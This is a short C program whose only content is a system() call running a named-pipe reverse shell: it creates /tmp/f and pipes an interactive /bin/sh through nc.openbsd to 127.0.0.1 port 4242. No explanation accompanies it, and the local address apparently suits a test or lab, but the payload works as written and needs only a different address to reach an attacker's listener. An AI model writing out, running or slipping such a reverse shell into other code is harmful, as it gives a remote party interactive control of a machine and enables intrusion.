#include <stdlib.h>
int main() {
    system("mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc.openbsd 127.0.0.1 4242 >/tmp/f");
    return 0;
}
